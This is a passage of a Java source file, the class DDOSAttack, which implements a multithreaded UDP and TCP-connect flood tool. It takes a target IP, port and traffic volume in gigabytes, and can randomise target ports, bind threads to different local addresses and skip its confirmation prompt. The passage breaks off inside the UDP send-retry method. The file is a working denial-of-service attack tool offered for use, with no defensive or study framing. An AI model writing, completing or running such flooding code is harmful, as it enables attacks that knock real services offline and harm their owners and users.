import java.io.*;
import java.net.*;
import java.nio.ByteBuffer;
import java.nio.channels.ClosedByInterruptException;
import java.nio.channels.DatagramChannel;
import java.util.*;
import java.util.concurrent.*;
import java.util.concurrent.atomic.AtomicLong;
import java.util.concurrent.atomic.LongAdder;


class DDOSAttack {

    // ==================== Constants ====================
    static final int IP_HEADER_LEN = 20;
    static final int UDP_HEADER_LEN = 8;
    static final int TCP_HEADER_LEN = 20;
    static final int MIN_PAYLOAD = 64;
    static final int MAX_PAYLOAD = 65000;
    static final int TCP_DEFAULT_PAYLOAD = 64;
    static final int UDP_DEFAULT_PAYLOAD = 1490;
    // Max wait step in GlobalRateLimiter to avoid overflow
    static final long RATE_LIMITER_MAX_WAIT_MS = 100L;

    // ==================== Config ====================
    static class Config {
        String targetIP;
        int targetPort;
        double gb;
        int packetSize = -1;         // -1 means "not user-specified"
        int numThreads = 4;
        int burstSize = 50;
        double rateLimit = 0.0;
        int duration = 0;
        int srcPortBase = -1;
        boolean randomTargetPort = false;
        boolean bindLocal = false;
        boolean varyPayload = true;
        boolean useTcp = false;
        String logFile = null;
        int maxRetries = 3;
        boolean assumeYes = false;   // -y/--yes

        long totalPackets;
        int payloadSize;
        int overhead;
        int totalWireBytes;
    }

    // ==================== Stats ====================
    static class Stats {
        // LongAdder for pure increments (no CAS needed)
        final LongAdder sent = new LongAdder();
        final LongAdder bytesSent = new LongAdder();
        final LongAdder dropped = new LongAdder();

        // AtomicLong for attempts because we need strict CAS-based cap
        final AtomicLong attempts = new AtomicLong(0);

        final LongAdder errBind = new LongAdder();
        final LongAdder errPortUnreach = new LongAdder();
        final LongAdder errIO = new LongAdder();
        final LongAdder errOther = new LongAdder();

        // Bounded error history with O(1) size
        static final int ERR_HISTORY_MAX = 10;
        private final ArrayDeque<String> recentErrors = new ArrayDeque<>();
        private int recentErrorsSize = 0;
        private final Object recentErrorsLock = new Object();

        final ErrorRateLimiter errorLimiter = new ErrorRateLimiter(5);

        // Strict: never returns true more than "limit" times total
        boolean reserveAttempt(long limit) {
            while (true) {
                long cur = attempts.get();
                if (cur >= limit) return false;
                if (attempts.compareAndSet(cur, cur + 1)) return true;
            }
        }

        void recordError(String category, String tag, String detail) {
            switch (category) {
                case "bind": errBind.increment(); break;
                case "port_unreach": errPortUnreach.increment(); break;
                case "io": errIO.increment(); break;
                default: errOther.increment(); break;
            }
            if (errorLimiter.allow()) {
                synchronized (recentErrorsLock) {
                    recentErrors.addLast("[" + tag + "] " + category + ": " + detail);
                    recentErrorsSize++;
                    while (recentErrorsSize > ERR_HISTORY_MAX) {
                        recentErrors.pollFirst();
                        recentErrorsSize--;
                    }
                }
            }
        }

        List<String> snapshotErrors() {
            synchronized (recentErrorsLock) {
                return new ArrayList<>(recentErrors);
            }
        }

        long totalErrors() {
            return errBind.longValue() + errPortUnreach.longValue()
                 + errIO.longValue() + errOther.longValue();
        }
    }

    // ==================== ErrorRateLimiter ====================
    static class ErrorRateLimiter {
        final int maxPerSec;
        long windowStart;
        int count;
        long suppressed;

        ErrorRateLimiter(int maxPerSec) {
            this.maxPerSec = maxPerSec;
            this.windowStart = System.currentTimeMillis();
        }

        synchronized boolean allow() {
            long now = System.currentTimeMillis();
            if (now - windowStart > 1000) {
                windowStart = now;
                count = 0;
            }
            if (count < maxPerSec) {
                count++;
                return true;
            }
            suppressed++;
            return false;
        }

        synchronized long suppressed() { return suppressed; }
    }

    // ==================== GlobalRateLimiter ====================
    // Single shared token bucket. Long-term rate = burstSize / rateLimit pps.
    // Uses fixed small wait steps to avoid any long/overflow issues.
    static class GlobalRateLimiter {
        final double tokensPerSecond;
        final double maxTokens;
        double tokens;
        long lastRefillNs;
        final Object lock = new Object();

        GlobalRateLimiter(double secondsPerBurst, int burstSize) {
            if (secondsPerBurst > 0 && burstSize > 0) {
                // Guard: extremely small tokensPerSecond would make us wait forever per packet.
                // Minimum 0.001 tokens/s (i.e. one packet per 1000 s) is already absurd but safe.
                double tps = burstSize / secondsPerBurst;
                if (tps < 0.001) {
                    System.err.println("[!] rateLimit too large, tokensPerSecond floored at 0.001");
                    tps = 0.001;
                }
                this.tokensPerSecond = tps;
                this.maxTokens = Math.max(1.0, burstSize * 2.0);
            } else {
                this.tokensPerSecond = 0;
                this.maxTokens = 0;
            }
            this.tokens = maxTokens;
            this.lastRefillNs = System.nanoTime();
        }

        void acquire(int n) throws InterruptedException {
            if (tokensPerSecond <= 0) return;
            if (n <= 0) return;
            // If asking more than capacity, we must still make progress
            while (true) {
                synchronized (lock) {
                    refill();
                    if (tokens >= n) {
                        tokens -= n;
                        return;
                    }
                    // Compute needed wait, but cap step to RATE_LIMITER_MAX_WAIT_MS
                    double needed = n - tokens;
                    double neededMs = needed / tokensPerSecond * 1000.0;
                    long waitMs;
                    if (neededMs > RATE_LIMITER_MAX_WAIT_MS) {
                        waitMs = RATE_LIMITER_MAX_WAIT_MS;
                    } else if (neededMs < 1.0) {
                        waitMs = 1;
                    } else {
                        waitMs = (long) neededMs;
                    }
                    try {
                        lock.wait(waitMs);
                    } catch (InterruptedException e) {
                        Thread.currentThread().interrupt();
                        throw e;
                    }
                }
            }
        }

        private void refill() {
            long now = System.nanoTime();
            double elapsed = (now - lastRefillNs) / 1e9;
            if (elapsed > 0) {
                tokens = Math.min(maxTokens, tokens + elapsed * tokensPerSecond);
                lastRefillNs = now;
            }
        }
    }

    // ==================== Logger ====================
    static class Logger {
        final PrintWriter fp;
        final Object lock = new Object();

        Logger(String path) {
            PrintWriter w = null;
            if (path != null) {
                try {
                    w = new PrintWriter(new FileWriter(path, true));
                } catch (IOException e) {
                    System.err.println("[!] Cannot open log file: " + e.getMessage());
                }
            }
            this.fp = w;
        }

        void log(String msg) {
            synchronized (lock) {
                System.out.println(msg);
                if (fp != null) { fp.println(msg); fp.flush(); }
            }
        }

        void err(String msg) {
            synchronized (lock) {
                System.err.println(msg);
                if (fp != null) { fp.println(msg); fp.flush(); }
            }
        }

        void close() {
            synchronized (lock) {
                if (fp != null) fp.close();
            }
        }
    }

    // ==================== main ====================
    public static void main(String[] args) throws Exception {
        // Selftest entry point
        for (String a : args) {
            if ("--selftest".equals(a)) {
                System.exit(runSelfTest() ? 0 : 1);
            }
        }

        Config cfg = new Config();
        if (!parseArgs(args, cfg)) return;

        finalizeConfig(cfg);
        if (cfg.totalPackets <= 0) {
            System.err.println("[!] Traffic too small after finalization");
            System.exit(1);
        }

        Logger logger = new Logger(cfg.logFile);

        List<InetAddress> localAddresses = new ArrayList<>();
        if (cfg.bindLocal) {
            localAddresses = enumerateLocalAddresses();
            if (localAddresses.isEmpty()) {
                logger.err("[!] No usable local addresses, --bind-local disabled");
                cfg.bindLocal = false;
            }
        }

        InetSocketAddress[] portAddresses = null;
        if (cfg.randomTargetPort && !cfg.useTcp) {
            portAddresses = new InetSocketAddress[65536];
            for (int i = 1; i <= 65535; i++) {
                portAddresses[i] = new InetSocketAddress(cfg.targetIP, i);
            }
        }

        Stats stats = new Stats();
        GlobalRateLimiter limiter = new GlobalRateLimiter(cfg.rateLimit, cfg.burstSize);

        printSummary(cfg, logger);

        if (!confirmAttack(cfg, logger)) {
            logger.log("[>] Cancelled");
            logger.close();
            return;
        }

        long startTime = System.currentTimeMillis();
        if (cfg.useTcp) {
            runTcpAttack(cfg, stats, limiter, localAddresses, logger);
        } else {
            runUdpAttack(cfg, stats, limiter, portAddresses, localAddresses, logger);
        }
        long elapsed = System.currentTimeMillis() - startTime;

        printFinalStats(cfg, stats, elapsed, logger);
        logger.close();
    }

    // ==================== parse args ====================
    // Negatives are only allowed for options in this whitelist
    static final Set<String> NEGATIVE_VALUE_OPTIONS = new HashSet<>(Arrays.asList(
            "-s", "--src-port"
    ));

    static boolean parseArgs(String[] args, Config cfg) {
        Map<String, String> params = new HashMap<>();
        for (int i = 0; i < args.length; i++) {
            String arg = args[i];
            if (!arg.startsWith("-")) {
                System.err.println("[!] Unexpected argument: " + arg);
                return false;
            }
            if (arg.startsWith("--") && arg.contains("=")) {
                int eq = arg.indexOf('=');
                params.put(arg.substring(0, eq), arg.substring(eq + 1));
                continue;
            }
            // Long form must have a value; short form may be bare flag
            boolean isLong = arg.startsWith("--");
            boolean takesValue = isLong || NEGATIVE_VALUE_OPTIONS.contains(arg)
                    || isKnownValueOption(arg);
            if (takesValue && i + 1 < args.length && isValue(args[i + 1], arg)) {
                params.put(arg, args[i + 1]);
                i++;
            } else if (isLong) {
                // Long option with no value -> error
                System.err.println("[!] " + arg + " requires a value");
                return false;
            } else {
                params.put(arg, "true");
            }
        }

        if (params.containsKey("-h") || params.containsKey("--help")) {
            printUsage();
            return false;
        }

        // ----- target -----
        cfg.targetIP = params.getOrDefault("-t", params.get("--target"));
        if (cfg.targetIP == null) {
            System.err.println("[!] Missing -t/--target");
            return false;
        }
        try {
            InetAddress.getByName(cfg.targetIP);
        } catch (UnknownHostException e) {
            System.err.println("[!] Invalid target IP: " + cfg.targetIP);
            return false;
        }

        // ----- port -----
        String portStr = params.getOrDefault("-p", params.get("--port"));
        if (portStr == null) {
            System.err.println("[!] Missing -p/--port");
            return false;
        }
        try {
            cfg.targetPort = Integer.parseInt(portStr);
        } catch (NumberFormatException e) {
            System.err.println("[!] Invalid port: " + portStr);
            return false;
        }
        if (cfg.targetPort < 1 || cfg.targetPort > 65535) {
            System.err.println("[!] Port out of range: " + cfg.targetPort);
            return false;
        }

        // ----- gb -----
        String gbStr = params.getOrDefault("-g", params.get("--gb"));
        if (gbStr == null) {
            System.err.println("[!] Missing -g/--gb");
            return false;
        }
        try {
            cfg.gb = Double.parseDouble(gbStr);
        } catch (NumberFormatException e) {
            System.err.println("[!] Invalid GB: " + gbStr);
            return false;
        }
        if (cfg.gb <= 0) {
            System.err.println("[!] GB must be > 0");
            return false;
        }

        // ----- threads (-P / -T / --processes / --threads) -----
        String threadsStr = params.getOrDefault("-P", params.get("-T"));
        if (threadsStr == null) threadsStr = params.get("--processes");
        if (threadsStr == null) threadsStr = params.get("--threads");
        if (threadsStr != null) {
            try { cfg.numThreads = Integer.parseInt(threadsStr); }
            catch (NumberFormatException e) {
                System.err.println("[!] Invalid thread count: " + threadsStr);
                return false;
            }
            if (cfg.numThreads < 1) {
                System.err.println("[!] Thread count must be >= 1");
                return false;
            }
        }

        // ----- burst -----
        if (params.containsKey("-b") || params.containsKey("--burst")) {
            String s = params.getOrDefault("-b", params.get("--burst"));
            try { cfg.burstSize = Integer.parseInt(s); }
            catch (NumberFormatException e) {
                System.err.println("[!] Invalid burst: " + s);
                return false;
            }
            if (cfg.burstSize < 1) {
                System.err.println("[!] Burst must be >= 1");
                return false;
            }
        }

        // ----- rate -----
        if (params.containsKey("-r") || params.containsKey("--rate")) {
            String s = params.getOrDefault("-r", params.get("--rate"));
            try { cfg.rateLimit = Double.parseDouble(s); }
            catch (NumberFormatException e) {
                System.err.println("[!] Invalid rate: " + s);
                return false;
            }
            if (cfg.rateLimit < 0) {
                System.err.println("[!] Rate must be >= 0");
                return false;
            }
        }

        // ----- duration -----
        if (params.containsKey("-d") || params.containsKey("--duration")) {
            String s = params.getOrDefault("-d", params.get("--duration"));
            try { cfg.duration = Integer.parseInt(s); }
            catch (NumberFormatException e) {
                System.err.println("[!] Invalid duration: " + s);
                return false;
            }
            if (cfg.duration < 0) {
                System.err.println("[!] Duration must be >= 0");
                return false;
            }
        }

        // ----- src port -----
        if (params.containsKey("-s") || params.containsKey("--src-port")) {
            String s = params.getOrDefault("-s", params.get("--src-port"));
            try { cfg.srcPortBase = Integer.parseInt(s); }
            catch (NumberFormatException e) {
                System.err.println("[!] Invalid src-port: " + s);
                return false;
            }
            if (cfg.srcPortBase != -1 && (cfg.srcPortBase < 1 || cfg.srcPortBase > 65535)) {
                System.err.println("[!] src-port must be -1 or 1-65535");
                return false;
            }
        }

        // ----- size (mark as user-specified) -----
        boolean sizeUserSpecified = false;
        if (params.containsKey("--size")) {
            String s = params.get("--size");
            try { cfg.packetSize = Integer.parseInt(s); }
            catch (NumberFormatException e) {
                System.err.println("[!] --size must be an integer, got: " + s);
                return false;
            }
            sizeUserSpecified = true;
        }

        // ----- boolean flags -----
        cfg.randomTargetPort = params.containsKey("--random-port");
        cfg.bindLocal = params.containsKey("--bind-local");
        cfg.useTcp = params.containsKey("--tcp");
        cfg.varyPayload = !params.containsKey("--no-vary");
        cfg.assumeYes = params.containsKey("-y") || params.containsKey("--yes");

        if (params.containsKey("--log")) cfg.logFile = params.get("--log");

        if (params.containsKey("--max-retries")) {
            String s = params.get("--max-retries");
            try { cfg.maxRetries = Integer.parseInt(s); }
            catch (NumberFormatException e) {
                System.err.println("[!] --max-retries must be an integer, got: " + s);
                return false;
            }
            if (cfg.maxRetries < 0) {
                System.err.println("[!] max-retries must be >= 0");
                return false;
            }
        }

        // ----- defaults per protocol -----
        if (cfg.useTcp) {
            if (!sizeUserSpecified) {
                cfg.packetSize = TCP_DEFAULT_PAYLOAD;
            }
            if (cfg.randomTargetPort) {
                System.err.println("[!] --random-port ignored in TCP mode");
                cfg.randomTargetPort = false;
            }
            if (params.containsKey("--no-vary")) {
                System.err.println("[!] --no-vary ignored in TCP mode");
            }
            cfg.varyPayload = false;
        } else {
            if (!sizeUserSpecified) {
                cfg.packetSize = UDP_DEFAULT_PAYLOAD;
            }
        }

        return true;
    }

    // Which short options take a value (for parse logic)
    static boolean isKnownValueOption(String opt) {
        switch (opt) {
            case "-t": case "-p": case "-g": case "-P": case "-T":
            case "-b": case "-r": case "-d":
                return true;
            default:
                return false;
        }
    }

    // Value detection: only allow "-N" style for whitelisted options
    static boolean isValue(String s, String prevOpt) {
        if (s == null || s.isEmpty()) return false;
        if (!s.startsWith("-")) return true;
        if (NEGATIVE_VALUE_OPTIONS.contains(prevOpt)) {
            try {
                Double.parseDouble(s);
                return true;
            } catch (NumberFormatException e) {
                return false;
            }
        }
        return false;
    }

    // ==================== finalize config ====================
    static void finalizeConfig(Config cfg) {
        if (cfg.packetSize < MIN_PAYLOAD) cfg.packetSize = MIN_PAYLOAD;
        if (cfg.packetSize > MAX_PAYLOAD) cfg.packetSize = MAX_PAYLOAD;

        if (cfg.useTcp) {
            // TCP now uses user-specified payload directly (default 64 applied in parseArgs)
            cfg.payloadSize = cfg.packetSize;
            cfg.overhead = IP_HEADER_LEN + TCP_HEADER_LEN;
        } else {
            cfg.payloadSize = cfg.packetSize;
            cfg.overhead = IP_HEADER_LEN + UDP_HEADER_LEN;
        }
        cfg.totalWireBytes = cfg.payloadSize + cfg.overhead;

        long targetBytes = (long)(cfg.gb * 1024.0 * 1024.0 * 1024.0);
        cfg.totalPackets = targetBytes / cfg.totalWireBytes;
        if (cfg.totalPackets <= 0) cfg.totalPackets = 0;
    }

    // ==================== local address enumeration ====================
    static List<InetAddress> enumerateLocalAddresses() {
        List<InetAddress> result = new ArrayList<>();
        try {
            Enumeration<NetworkInterface> ifaces = NetworkInterface.getNetworkInterfaces();
            if (ifaces == null) return result;
            for (NetworkInterface iface : Collections.list(ifaces)) {
                if (!iface.isUp() || iface.isLoopback()) continue;
                for (InterfaceAddress ia : iface.getInterfaceAddresses()) {
                    InetAddress addr = ia.getAddress();
                    if (addr instanceof Inet4Address) result.add(addr);
                }
            }
        } catch (SocketException e) {
            System.err.println("[!] Failed to enumerate interfaces: " + e.getMessage());
        }
        return result;
    }

    // ==================== usage ====================
    static void printUsage() {
        System.out.println("[+] Usage: java DDOSAttack -t <IP> -p <PORT> -g <GB> [options]");
        System.out.println();
        System.out.println("[+] Required:");
        System.out.println("  -t, --target        Target IP");
        System.out.println("  -p, --port          Target port");
        System.out.println("  -g, --gb            Total traffic (GB)");
        System.out.println();
        System.out.println("[+] Optional:");
        System.out.println("  -P, --processes     Thread count (default 4)");
        System.out.println("  -T, --threads       Same as -P (alias)");
        System.out.println("  -b, --burst         Packets per burst (default 50, must be >= 1)");
        System.out.println("  -r, --rate          Seconds per burst, global rate = burstSize/rate pps");
        System.out.println("  -d, --duration      Duration in seconds (default 0 = until finished)");
        System.out.println("  -s, --src-port      Source port base, -1 = random (default -1)");
        System.out.println("  --size              Payload size in bytes");
        System.out.println("                      UDP default 1490, TCP default 64; --size overrides both");
        System.out.println("  --random-port       Randomize target port (UDP only)");
        System.out.println("  --bind-local        Bind each thread to a different local IP");
        System.out.println("  --tcp               TCP connect flood (not SYN)");
        System.out.println("  --vary / --no-vary  Payload variation (UDP only, default: on)");
        System.out.println("  -y, --yes           Skip interactive confirmation (for scripting/CI)");
        System.out.println("  --log <file>        Log file path");
        System.out.println("  --max-retries       Max retries per packet (default 3)");
        System.out.println("  --selftest          Run internal unit tests and exit");
        System.out.println("  -h, --help          Show this help");
        System.out.println();
        System.out.println("[+] Notes:");
        System.out.println("  * Traffic accounting includes headers (UDP +28B, TCP +40B).");
        System.out.println("  * Total attempts are strictly capped via CAS; never exceeds target.");
        System.out.println("  * Thread interrupt is handled separately and never counted as IO error.");
        System.out.println("  * --yes is required when stdin is not a TTY.");
    }

    // ==================== summary and confirm ====================
    static void printSummary(Config cfg, Logger logger) {
        logger.log("");
        logger.log("[+] target=" + cfg.targetIP + ":" + cfg.targetPort
                + "  proto=" + (cfg.useTcp ? "TCP" : "UDP")
                + "  traffic=" + String.format("%.2f", cfg.gb) + "GB"
                + "  packets=" + cfg.totalPackets
                + "  threads=" + cfg.numThreads
                + "  payload=" + cfg.payloadSize + "B"
                + "  wire=" + cfg.totalWireBytes + "B"
                + (cfg.randomTargetPort ? "  random-port" : ""));
        if (cfg.rateLimit > 0) {
            logger.log("[+] Global rate: "
                    + String.format("%.0f", cfg.burstSize / cfg.rateLimit) + " pps");
        }
        if (cfg.bindLocal) {
            logger.log("[+] Per-thread local IP bind (Java cannot spoof source IP)");
        }
        logger.log("[+] Attempts strictly capped at " + cfg.totalPackets);
        logger.log("[+] attacking... (Ctrl+C to stop)");
    }

    static boolean confirmAttack(Config cfg, Logger logger) {
        if (cfg.assumeYes) return true;
        if (System.console() == null) {
            logger.err("[!] No TTY detected, cannot prompt. Add -y/--yes for non-interactive use.");
            return false;
        }
        try {
            System.out.print("\n[!] Confirm attack (yes/no): ");
            System.out.flush();
            BufferedReader reader = new BufferedReader(new InputStreamReader(System.in));
            String line = reader.readLine();
            return line != null && line.trim().equalsIgnoreCase("yes");
        } catch (IOException e) {
            return false;
        }
    }

    // ==================== UDP attack ====================
    static void runUdpAttack(Config cfg, Stats stats, GlobalRateLimiter limiter,
                              InetSocketAddress[] portAddresses,
                              List<InetAddress> localAddresses, Logger logger) throws Exception {
        ExecutorService executor = Executors.newFixedThreadPool(cfg.numThreads);
        List<Future<?>> futures = new ArrayList<>();
        // Per-thread share of attempts (approximate; global cap is enforced by CAS)
        long perThread = cfg.totalPackets / cfg.numThreads;
        long extra = cfg.totalPackets % cfg.numThreads;

        for (int i = 0; i < cfg.numThreads; i++) {
            long quota = perThread + (i < extra ? 1 : 0);
            final int threadId = i;
            futures.add(executor.submit(() ->
                    udpWorker(threadId, quota, cfg, stats, limiter,
                              portAddresses, localAddresses, logger)));
        }
        monitorProgress(cfg, stats, futures, executor, logger);
    }

    static void udpWorker(int threadId, long perThreadQuota, Config cfg, Stats stats,
                          GlobalRateLimiter limiter,
                          InetSocketAddress[] portAddresses,
                          List<InetAddress> localAddresses, Logger logger) {
        String tag = "T" + threadId;
        ThreadLocalRandom rnd = ThreadLocalRandom.current();
        List<byte[]> pool = buildVariantPool(cfg.payloadSize, 512, cfg.varyPayload, rnd);

        InetAddress bindAddr = null;
        int bindPort = 0;
        if (cfg.bindLocal && !localAddresses.isEmpty()) {
            bindAddr = localAddresses.get(threadId % localAddresses.size());
        }
        if (cfg.srcPortBase >= 0) bindPort = cfg.srcPortBase + threadId;

        DatagramChannel channel = null;
        long sent = 0, bytes = 0, dropped = 0;
        long lastReportSent = 0, lastReportBytes = 0, lastReportDropped = 0;
        long packetCounter = 0;
        long localAttempts = 0;
        int consecutiveFail = 0;
        boolean interrupted = false;

        try {
            channel = openUdpChannel(bindAddr, bindPort, tag, stats);
            InetSocketAddress dest = new InetSocketAddress(cfg.targetIP, cfg.targetPort);

            while (!Thread.currentThread().isInterrupted() && localAttempts < perThreadQuota) {
                int toSend = (int) Math.min(cfg.burstSize, perThreadQuota - localAttempts);
                if (toSend <= 0) break;

                try {
                    limiter.acquire(toSend);
                } catch (InterruptedException e) {
                    Thread.currentThread().interrupt();
                    break;
                }

                for (int j = 0; j < toSend; j++) {
                    if (Thread.currentThread().isInterrupted()) break;
                    if (localAttempts >= perThreadQuota) break;

                    // Strict global cap via CAS
                    if (!stats.reserveAttempt(cfg.totalPackets)) {
                        return;
                    }
                    localAttempts++;

                    byte[] payload = pool.get((int)(packetCounter % pool.size()));
                    if (cfg.varyPayload) mutatePayload(payload, packetCounter, rnd);
                    packetCounter++;

                    InetSocketAddress targetAddr;
                    if (cfg.randomTargetPort) {
                        int port = rnd.nextInt(1, 65536);
                        targetAddr = portAddresses[port];
                    } else {
                        targetAddr = dest;
                    }

                    SendResult r = sendUdpWithRetry(channel, payload, targetAddr,
                                                     cfg.maxRetries, tag, stats);
                    if (r == SendResult.OK) {
                        sent++;
                        bytes += cfg.totalWireBytes;
                        consecutiveFail = 0;
                    } else if (r == SendResult.INTERRUPTED) {
                        interrupted = true;
                        break;
                    } else {
                        dropped++;
                        consecutiveFail++;
                        if (consecutiveFail >= 3) {
                            try {
                                long backoffMs = Math.min(1000, 10L << Math.min(consecutiveFail - 3, 6));
                                Thread.sleep(backoffMs);
                            } catch (InterruptedException e) {
                                Thread.currentThread().interrupt();
                                interrupted = true;
                                break;
                            }
                            if (channel == null || !channel.isOpen()) {
                                if (channel != null) {
                                    try { channel.close(); } catch (IOException ignored) {}
                                }
                                try {
                                    channel = openUdpChannel(bindAddr, bindPort, tag, stats);
                                } catch (IOException e) {
                                    stats.recordError("io", tag, "reopen failed: " + e.getMessage());
                                    break;
                                }
                            }
                        }
                    }
                }
                if (interrupted) break;

                long dSent = sent - lastReportSent;
                long dBytes = bytes - lastReportBytes;
                long dDropped = dropped - lastReportDropped;
                if (dSent > 0) stats.sent.add(dSent);
                if (dBytes > 0) stats.bytesSent.add(dBytes);
                if (dDropped > 0) stats.dropped.add(dDropped);
                lastReportSent = sent;
                lastReportBytes = bytes;
                lastReportDropped = dropped;
            }

            long dSent = sent - lastReportSent;
            long dBytes = bytes - lastReportBytes;
            long dDropped = dropped - lastReportDropped;
            if (dSent > 0) stats.sent.add(dSent);
            if (dBytes > 0) stats.bytesSent.add(dBytes);
            if (dDropped > 0) stats.dropped.add(dDropped);

        } catch (Exception e) {
            // Only genuine unexpected errors land here
            if (!Thread.currentThread().isInterrupted()) {
                stats.recordError("other", tag, "fatal: " + e.getClass().getSimpleName()
                        + " (" + e.getMessage() + ")");
            }
        } finally {
            if (channel != null) {
                try { channel.close(); } catch (IOException ignored) {}
            }
        }
    }

    // ==================== TCP attack ====================
    static void runTcpAttack(Config cfg, Stats stats, GlobalRateLimiter limiter,
                              List<InetAddress> localAddresses, Logger logger) throws Exception {
        ExecutorService executor = Executors.newFixedThreadPool(cfg.numThreads);
        List<Future<?>> futures = new ArrayList<>();
        long perThread = cfg.totalPackets / cfg.numThreads;
        long extra = cfg.totalPackets % cfg.numThreads;

        for (int i = 0; i < cfg.numThreads; i++) {
            long quota = perThread + (i < extra ? 1 : 0);
            final int threadId = i;
            futures.add(executor.submit(() ->
                    tcpWorker(threadId, quota, cfg, stats, limiter, localAddresses, logger)));
        }
        monitorProgress(cfg, stats, futures, executor, logger);
    }

    static void tcpWorker(int threadId, long perThreadQuota, Config cfg, Stats stats,
                          GlobalRateLimiter limiter,
                          List<InetAddress> localAddresses, Logger logger) {
        String tag = "T" + threadId;
        ThreadLocalRandom rnd = ThreadLocalRandom.current();

        InetAddress bindAddr = null;
        if (cfg.bindLocal && !localAddresses.isEmpty()) {
            bindAddr = localAddresses.get(threadId % localAddresses.size());
        }

        byte[] payload = new byte[cfg.payloadSize];
        rnd.nextBytes(payload);

        long sent = 0, bytes = 0, dropped = 0, localAttempts = 0;
        long lastReportSent = 0, lastReportBytes = 0, lastReportDropped = 0;
        int consecutiveFail = 0;

        while (!Thread.currentThread().isInterrupted() && localAttempts < perThreadQuota) {
            int toSend = (int) Math.min(cfg.burstSize, perThreadQuota - localAttempts);
            if (toSend <= 0) break;

            try {
                limiter.acquire(toSend);
            } catch (InterruptedException e) {
                Thread.currentThread().interrupt();
                break;
            }

            for (int j = 0; j < toSend; j++) {
                if (Thread.currentThread().isInterrupted()) break;
                if (localAttempts >= perThreadQuota) break;
                if (!stats.reserveAttempt(cfg.totalPackets)) return;
                localAttempts++;

                try (Socket s = new Socket()) {
                    if (bindAddr != null) s.bind(new InetSocketAddress(bindAddr, 0));
                    s.setSoTimeout(500);
                    s.connect(new InetSocketAddress(cfg.targetIP, cfg.targetPort), 1000);
                    OutputStream os = s.getOutputStream();
                    os.write(payload);
                    os.flush();
                    sent++;
                    bytes += cfg.totalWireBytes;
                    consecutiveFail = 0;
                } catch (PortUnreachableException e) {
                    if (Thread.currentThread().isInterrupted()) break;
                    stats.recordError("port_unreach", tag, e.getMessage());
                    dropped++;
                    consecutiveFail++;
                } catch (IOException e) {
                    if (Thread.currentThread().isInterrupted()) break;
                    stats.recordError("io", tag, e.getMessage());
                    dropped++;
                    consecutiveFail++;
                }

                if (consecutiveFail >= 3) {
                    try {
                        long backoffMs = Math.min(1000, 10L << Math.min(consecutiveFail - 3, 6));
                        Thread.sleep(backoffMs);
                    } catch (InterruptedException e) {
                        Thread.currentThread().interrupt();
                        return;
                    }
                }
            }

            long dSent = sent - lastReportSent;
            long dBytes = bytes - lastReportBytes;
            long dDropped = dropped - lastReportDropped;
            if (dSent > 0) stats.sent.add(dSent);
            if (dBytes > 0) stats.bytesSent.add(dBytes);
            if (dDropped > 0) stats.dropped.add(dDropped);
            lastReportSent = sent;
            lastReportBytes = bytes;
            lastReportDropped = dropped;
        }

        long dSent = sent - lastReportSent;
        long dBytes = bytes - lastReportBytes;
        long dDropped = dropped - lastReportDropped;
        if (dSent > 0) stats.sent.add(dSent);
        if (dBytes > 0) stats.bytesSent.add(dBytes);
        if (dDropped > 0) stats.dropped.add(dDropped);
    }

    // ==================== progress monitor ====================
    static void monitorProgress(Config cfg, Stats stats, List<Future<?>> futures,
                                 ExecutorService executor, Logger logger) throws Exception {
        long start = System.currentTimeMillis();
        long lastReport = start;
        long lastReportSent = 0;

        while (true) {
            long now = System.currentTimeMillis();
            long elapsed = now - start;
            long attempts = stats.attempts.get();
            long sent = stats.sent.longValue();

            if (attempts >= cfg.totalPackets) break;
            if (cfg.duration > 0 && elapsed / 1000 >= cfg.duration) break;

            if (now - lastReport >= 1000) {
                long deltaSent = sent - lastReportSent;
                double dt = (now - lastReport) / 1000.0;
                double inst = deltaSent / dt;
                double avg = elapsed > 0 ? sent / (elapsed / 1000.0) : 0;
                double gb = stats.bytesSent.longValue() / (1024.0 * 1024 * 1024);
                logger.log(String.format(
                        "[+] sent=%d attempts=%d  data=%.4fGB  rate=%.0fpps  inst=%.0fpps  drop=%d  err=%d",
                        sent, attempts, gb, avg, inst,
                        stats.dropped.longValue(), stats.totalErrors()));
                lastReport = now;
                lastReportSent = sent;
            }
            Thread.sleep(100);
        }

        for (Future<?> f : futures) f.cancel(true);
        executor.shutdownNow();
        for (Future<?> f : futures) {
            try { f.get(2, TimeUnit.SECONDS); }
            catch (Exception ignored) { /* Best effort; interrupt already sent */ }
        }
    }

    // ==================== final stats ====================
    static void printFinalStats(Config cfg, Stats stats, long elapsed, Logger logger) {
        long sent = stats.sent.longValue();
        long attempts = stats.attempts.get();
        long dropped = stats.dropped.longValue();
        long bytes = stats.bytesSent.longValue();
        double gb = bytes / (1024.0 * 1024 * 1024);
        double rate = elapsed > 0 ? sent / (elapsed / 1000.0) : 0;

        logger.log("");
        logger.log("[=] done:");
        logger.log("    packets sent:    " + sent);
        logger.log("    packets dropped: " + dropped);
        logger.log("    total attempts:  " + attempts + " / " + cfg.totalPackets);
        logger.log("    total data:      " + String.format("%.4f", gb) + " GB");
        logger.log("    elapsed:         " + String.format("%.2f", elapsed / 1000.0) + "s");
        logger.log("    average rate:    " + String.format("%.1f", rate) + " pps");
        logger.log("    errors:          bind=" + stats.errBind.longValue()
                + " port-unreach=" + stats.errPortUnreach.longValue()
                + " io=" + stats.errIO.longValue()
                + " other=" + stats.errOther.longValue()
                + " (log suppressed=" + stats.errorLimiter.suppressed() + ")");
        List<String> errs = stats.snapshotErrors();
        if (!errs.isEmpty()) {
            logger.log("    recent errors:");
            for (String e : errs) logger.log("      " + e);
        }
    }

    // ==================== UDP send ====================
    enum SendResult { OK, FAILED, INTERRUPTED }

    static SendResult sendUdpWithRetry(DatagramChannel channel, byte[] payload,
                                        SocketAddress target, int maxRetries,
                                        String tag, Stats stats) {
        ByteBuffer buf = ByteBuffer.wrap(payload);
        int attempt = 0;
        while (attempt <= maxRetries) {
            // Fast path: interrupted before send
            if (Thread.currentThread().isInterrupted()) return SendResult.INTERRUPTED;
            try {
                buf.clear();
                int written = channel.send(buf, target);
                if (written > 0) return SendResult.OK;
            } catch (ClosedByInterruptException e) {
                // Interrupt caused the channel to close; not a real error
                return SendResult.INTERRUPTED;
            } catch (java.nio.channels.AsynchronousCloseException e) {
                // Channel closed asynchronously; treat as interrupted
                return SendResult.INTERRUPTED;
            } catch (PortUnreachableException e) {
                if (Thread.currentThread().isInterrupted()) return SendResult.INTERRUPTED;
                stats.recordError("port_unreach", tag, target.toString());
            } catch (IOException e) {
                if (Thread.currentThread().isInterrupted()) return SendResult.INTERRUPTED;
                stats.recordError("io", tag, e.getMessage());
            } catch (Exception e) {
